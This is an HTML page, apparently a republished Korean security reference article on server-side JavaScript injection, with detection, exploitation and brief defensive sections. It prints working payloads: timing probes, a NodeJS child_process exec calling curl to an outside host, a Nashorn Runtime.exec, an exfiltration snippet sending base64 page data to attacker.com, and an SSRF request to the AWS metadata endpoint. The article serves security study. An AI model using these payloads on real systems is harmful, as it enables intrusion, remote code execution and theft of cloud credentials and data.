@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Server-Side Javascript Injection — PIXN</title>
+  <meta name="description" content="Server-Side Javascript Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Server-Side Javascript Injection — PIXN"><meta property="og:description" content="Server-Side Javascript Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Server-Side Javascript Injection</h1>
+      <time datetime="2022-02-27">FEBRUARY 27, 2022</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>SSJI(Server Side Javascript Injection)는 서버가 자체적으로 Javascript를 처리하는 엔진을 가지거나, 백엔드에서 Headless browser 등을 통해 처리하는 로직이 있는 경우 공격자가 이를 제어하여 서버사이드에서 원하는 Javascirpt를 실행하도록 하는 공격입니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p><code>eval()</code>, <code>setTimeout()</code>, <code>setInterval()</code> 등의 JS 함수를 포함한 요청을 전달하여 서버 사이드에서 이를 처리하는지 식별하면 됩니다. 가장 간단한 방법으론 setTimeout과 setInterval을 이용한 딜레이 체크입니다.</p>
+<p>Request</p>
+<pre><code>GET /import?unloadcode=setTimeout(a%3d1,%205000) HTTP/1.1
+</code></pre>
+<p>Response</p>
+<pre><code>HTTP/1.1 200
+
+// 단 delay time이 5초 정도 발생한다면 백엔드에서 처리할 가능성이 높음
+</code></pre>
+<p>대표적으로 많이 사용되는 Payloads는 아래와 같습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-number">1</span>\<span class="hljs-string">&#39;;var d=new Date();do{var cd=new Date();}while(cd-d&lt;1);var&gt;
+</span><span class="hljs-string">&#39;</span>a<span class="hljs-string">&#39;;sleep(1) and &#39;</span>a<span class="hljs-string">&#39;;sleep(10000)
+</span><span class="hljs-string">a;sleep(1) and a;sleep(10000)
+</span><span class="hljs-string">sleep(1) and sleep(10000)
+</span><span class="hljs-string">$where:&quot;sleep(1)&quot; and $where:&quot;sleep(10000)&quot;
+</span><span class="hljs-string">%5b%5d=_security and %5b%5d=_all_docs
+</span><span class="hljs-string">%5b%24eq%5d=1 and %5b%24ne%5d=1
+</span><span class="hljs-string">&#39;</span><span class="hljs-punctuation">;</span>sleep<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><span class="hljs-keyword">var</span> xyz<span class="hljs-operator">=</span><span class="hljs-string">&#39;0 and &#39;</span><span class="hljs-punctuation">;</span>sleep<span class="hljs-punctuation">(</span><span class="hljs-number">10000</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><span class="hljs-keyword">var</span> xyz<span class="hljs-operator">=</span>&#39;<span class="hljs-number">0</span>
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="rce-remote-code-execution">RCE (Remote Code Execution)</h4>
+<p>때때로 Javascript는 NodeJS, JVM(Java Virtual Machine) 위에서 동작하는 Javascript 엔진인 Nashorn이나 Graal 등 서버 사이드 많은 권한을 가지고 동작하기도 합니다. 이러한 경우 SSJI가 가능할 때 RCE 등 큰 리스크의 이슈로 연결될 수 있습니다.</p>
+<p>NodeJS</p>
+<pre><code class="language-javascript hljs">require<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;child_process&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>exec<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;curl%20cxcjyaf5wahkidrp2zvhxe6ola.odiss.eu&#39;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>Nashron</p>
+<pre><code class="language-javascript hljs">$<span class="hljs-punctuation">{</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-punctuation">.</span>getClass<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>forName<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;javax.script.ScriptEngineManager&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>newInstance<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>getEngineByName<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;js&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-built_in">eval</span><span class="hljs-punctuation">(</span><span class="hljs-string">&#39;java.lang.Runtime.getRuntime().exec(&quot;ifconfig&quot;)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h4 id="inforamtion-leakage">Inforamtion Leakage</h4>
+<p>백엔드 Javascript 가 사용하는 DOM이나 Memory에 있는 데이터들은 서버의 리소스입니다. 이를 통해서 DOM 구조와 소스코드를 탐색하고 중요한 정보를 탈취할 수 있습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> data <span class="hljs-operator">=</span> <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>documentElement<span class="hljs-punctuation">.</span>innerHTML<span class="hljs-punctuation">;</span>
+<span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>write<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;&lt;img src=https://attacker.com?q=&quot;</span><span class="hljs-operator">+</span>btoa<span class="hljs-punctuation">(</span>data<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h4 id="ssrf">SSRF</h4>
+<p>Javascript가 Server-side에서 동작하기 떄문에 ACL을 넘어 내부망에서의 웹 요청이 가능해집니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> xhr <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> XMLHttpRequest<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+xhr<span class="hljs-punctuation">.</span>onreadystatechange <span class="hljs-operator">=</span> <span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>xhr<span class="hljs-punctuation">.</span>readyState <span class="hljs-operator">===</span> xhr<span class="hljs-punctuation">.</span>DONE<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>xhr<span class="hljs-punctuation">.</span>status <span class="hljs-operator">===</span> <span class="hljs-number">200</span> <span class="hljs-operator">||</span> xhr<span class="hljs-punctuation">.</span>status <span class="hljs-operator">===</span> <span class="hljs-number">201</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+            <span class="hljs-built_in">document</span><span class="hljs-punctuation">.</span>write<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;&lt;img src=&#39;&quot;</span><span class="hljs-operator">+</span>btoa<span class="hljs-punctuation">(</span>xhr<span class="hljs-punctuation">.</span>responseText<span class="hljs-punctuation">)</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;&#39;&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+        <span class="hljs-punctuation">}</span> 
+    <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+xhr<span class="hljs-punctuation">.</span>open<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;GET&#39;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&#39;http://169.254.169.254/latest/meta-data/&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+xhr<span class="hljs-punctuation">.</span>send<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-comment">// SSJI를 통한 AWS Metadata 정보 탈취 SSRF
+</span><span class="hljs-comment"></span><span class="hljs-comment">// 운좋으면 RCE까지 가겠죠?
+</span><span class="hljs-comment"></span></code></pre>
+<p>이후 주요 페이지 접근이나 우회 패턴은 <a href="/reference/attack/ssrf/">SSRF</a>와 동일하니 참고해주세요.</p>
+<h4 id="other">Other</h4>
+<p>이외 <a href="/reference/attack/dom-clobbering/">DOM Clobbering</a>이나 Prototype Pollution 등 JS 기반의 테크닉은 모두 동일하게 사용할 수 있어 영향력을 높일 수 있습니다.</p>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>서버단에서 동작하는 Javascript는 Ruby, Python 등 스크립트와 동일한 권한이라고 생각하면 좋습니다. 가급적 사용자에게서 부터 입력 값은 받지 않도록 하고 혹여나 받아야 한다면 의도된 액션 이외에는 수행할 수 없도록 정확하게 검증이 필요합니다.</p>
+<h2 id="references">References</h2>
+<ul>
+<li>https://www.hahwul.com/2019/05/01/jqeury-prototype-pollution-cve-2019-11358/</li>
+<li>https://www.hahwul.com/cullinan/dom-clobbering/</li>
+<li>https://www.hahwul.com/cullinan/ssrf/</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/ssji/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
